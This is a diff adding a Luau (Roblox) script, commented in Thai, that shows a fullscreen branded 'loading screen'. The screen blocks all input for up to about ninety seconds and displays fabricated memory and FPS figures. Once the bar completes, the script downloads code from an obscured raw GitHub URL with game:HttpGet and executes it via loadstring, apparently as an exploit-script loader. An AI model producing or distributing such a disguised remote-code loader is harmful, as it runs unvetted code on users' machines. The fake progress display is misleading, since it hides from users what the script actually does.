@@ -1,0 +1,201 @@
+-- Yinyanghub_Olivia | VORTEX_ENGINE_DELTA-3.7.980
+-- Fullscreen Blocking Loading Screen (Luau / Roblox)
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local ContextActionService = game:GetService("ContextActionService")
+local Stats = game:GetService("Stats")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local TARGET_URL = "https://raw.githubusercontent.com/XASZD-NET/XKIUOOLRETGARFRXEC/refs/heads/main/Zigds/7376367/____%26__/All/Lua%2Cluau/Key-web-V3"
+local BASE_DURATION = 90.0 -- ประมาณ 1 นาที 30 วินาที เมื่อเครื่อง/เน็ตอยู่ในระดับปกติ
+local BAR_BLOCKS = 60
+
+-- ล้าง UI เก่าหากรันซ้ำ
+local existing = playerGui:FindFirstChild("Yinyanghub_LoadingOverlay")
+if existing then
+	existing:Destroy()
+end
+
+-- สร้าง ScreenGui เต็มหน้าจอและบล็อกการกด
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "Yinyanghub_LoadingOverlay"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.DisplayOrder = 999999
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = playerGui
+
+-- ปุ่มล่องหนเต็มจอเพื่อกินการคลิก/แตะทั้งหมด
+local blockerButton = Instance.new("TextButton")
+blockerButton.Name = "InputBlocker"
+blockerButton.Size = UDim2.fromScale(1, 1)
+blockerButton.Position = UDim2.fromScale(0, 0)
+blockerButton.BackgroundColor3 = Color3.fromRGB(243, 232, 255) -- สีม่วงอ่อนมาก
+blockerButton.BackgroundTransparency = 0.78 -- โปร่งแสงสูง เห็นฉากหลังเกือบทั้งหมด
+blockerButton.BorderSizePixel = 0
+blockerButton.Text = ""
+blockerButton.AutoButtonColor = false
+blockerButton.Active = true
+blockerButton.Modal = true
+blockerButton.ZIndex = 10
+blockerButton.Parent = screenGui
+
+-- บล็อกปุ่มคีย์บอร์ด/คอนโทรลเลอร์ทั้งหมดระหว่างโหลด
+local BLOCK_ACTION_NAME = "Yinyanghub_LockAllInputs"
+ContextActionService:BindActionAtPriority(
+	BLOCK_ACTION_NAME,
+	function()
+		return Enum.ContextActionResult.Sink
+	end,
+	false,
+	Enum.ContextActionPriority.High.Value + 1000,
+	unpack(Enum.UserInputType:GetEnumItems())
+)
+
+-- คอนเทนเนอร์ข้อความกึ่งกลางจอ
+local centerFrame = Instance.new("Frame")
+centerFrame.Name = "CenterInfo"
+centerFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+centerFrame.Position = UDim2.fromScale(0.5, 0.5)
+centerFrame.Size = UDim2.new(0.85, 0, 0.45, 0)
+centerFrame.BackgroundTransparency = 1
+centerFrame.ZIndex = 20
+centerFrame.Parent = blockerButton
+
+local listLayout = Instance.new("UIListLayout")
+listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+listLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+listLayout.SortOrder = Enum.SortOrder.LayoutOrder
+listLayout.Padding = UDim.new(0, 8)
+listLayout.Parent = centerFrame
+
+local function makeLabel(name, text, size, color, order, bold)
+	local lbl = Instance.new("TextLabel")
+	lbl.Name = name
+	lbl.LayoutOrder = order
+	lbl.Size = UDim2.new(1, 0, 0, size + 8)
+	lbl.BackgroundTransparency = 1
+	lbl.Text = text
+	lbl.TextColor3 = color
+	lbl.TextSize = size
+	lbl.Font = bold and Enum.Font.GothamBold or Enum.Font.Code
+	lbl.TextWrapped = true
+	lbl.ZIndex = 21
+	lbl.Parent = centerFrame
+
+	local stroke = Instance.new("UIStroke")
+	stroke.Color = Color3.fromRGB(255, 255, 255)
+	stroke.Thickness = 1
+	stroke.Transparency = 0.35
+	stroke.Parent = lbl
+
+	return lbl
+end
+
+makeLabel("TitleLabel", "Yinyanghub_Olivia", 24, Color3.fromRGB(59, 7, 100), 1, true)
+makeLabel("EngineLabel", "VORTEX_ENGINE_DELTA-3.7.980", 16, Color3.fromRGB(88, 28, 135), 2, true)
+local statsLabel = makeLabel("StatsLabel", "0mb/0fps", 16, Color3.fromRGB(76, 29, 149), 3, false)
+local barLabel = makeLabel("BarLabel", "[" .. string.rep(" ", BAR_BLOCKS) .. "]0%", 15, Color3.fromRGB(59, 7, 100), 4, false)
+
+-- ประเมินความแรงของเครื่องและเครือข่าย
+local function getPerformanceMultiplier()
+	local pingMs = 120
+	pcall(function()
+		local netItem = Stats.Network.ServerStatsItem:FindFirstChild("Data Ping")
+		if netItem then
+			pingMs = tonumber(netItem:GetValue()) or 120
+		end
+	end)
+
+	local memoryMb = 450
+	pcall(function()
+		memoryMb = tonumber(Stats:GetTotalMemoryUsageMb()) or 450
+	end)
+
+	local deviceBoost = 1.0
+	if UserInputService.VREnabled then
+		deviceBoost = 0.85
+	elseif UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+		-- มือถือ/แท็บเล็ต: ปรับตามแรงกด/แรมคร่าวๆ
+		deviceBoost = memoryMb < 900 and 1.15 or 0.9
+	else
+		-- เดสก์ท็อป: แรมใช้งานน้อยและปิงต่ำจะเร็วขึ้น
+		deviceBoost = (pingMs < 80 and memoryMb < 1400) and 0.65 or 1.0
+	end
+
+	local netFactor = math.clamp(pingMs / 100, 0.45, 2.2)
+	-- ยิ่งตัวคูณมาก ยิ่งใช้เวลานาน; ยิ่งน้อย ยิ่งโหลดเร็วขึ้น
+	local speedFactor = math.clamp((1.0 / netFactor) / deviceBoost, 0.25, 4.5)
+	return speedFactor, pingMs, memoryMb
+end
+
+local function buildBlockBar(pct)
+	local filled = math.clamp(math.floor((pct / 100) * BAR_BLOCKS + 0.5), 0, BAR_BLOCKS)
+	return "[" .. string.rep("|", filled) .. string.rep(" ", BAR_BLOCKS - filled) .. "]" .. tostring(pct) .. "%"
+end
+
+local elapsed = 0
+local frameCount = 0
+local fpsTimer = 0
+local currentFps = 24
+local currentMb = 457
+
+local finished = false
+local conn
+
+conn = RunService.RenderStepped:Connect(function(dt)
+	if finished then
+		return
+	end
+
+	dt = math.min(dt, 0.25)
+	frameCount += 1
+	fpsTimer += dt
+	if fpsTimer >= 0.25 then
+		currentFps = math.clamp(math.floor((frameCount / fpsTimer) + 0.5), 1, 240)
+		frameCount = 0
+		fpsTimer = 0
+	end
+
+	local speedFactor, pingMs, totalMemMb = getPerformanceMultiplier()
+	local effectiveDuration = math.clamp(BASE_DURATION / speedFactor, 8, 180)
+
+	elapsed += dt
+	local progress = math.clamp(elapsed / effectiveDuration, 0, 1)
+	local pct = math.floor(progress * 100)
+
+	-- คำนวณค่า mb ที่เปลี่ยนตามความแรงของเครื่อง/เน็ต และ FPS
+	local fpsScale = math.clamp(currentFps / 24, 0.25, 4.0)
+	local netScale = math.clamp(120 / math.max(pingMs, 15), 0.35, 3.0)
+	local memBase = math.clamp(totalMemMb * 0.45, 120, 1200)
+	currentMb = math.max(1, math.floor((memBase * fpsScale * netScale * (0.35 + 0.65 * progress)) + 0.5))
+
+	statsLabel.Text = string.format("%dmb/%dfps", currentMb, currentFps)
+	barLabel.Text = buildBlockBar(pct)
+
+	if progress >= 1 then
+		finished = true
+		conn:Disconnect()
+		ContextActionService:UnbindAction(BLOCK_ACTION_NAME)
+		screenGui:Destroy() -- ปิดหน้าต่างทันที ไม่มีหน้าต่างค้าง
+
+		-- รันสคริปต์เป้าหมายทันที
+		task.spawn(function()
+			local ok, err = pcall(function()
+				local source = game:HttpGet(TARGET_URL)
+				local fn = loadstring(source)
+				if fn then
+					fn()
+				end
+			end)
+			if not ok then
+				warn("[Yinyanghub_Olivia] Failed to execute script:", err)
+			end
+		end)
+	end
+end)
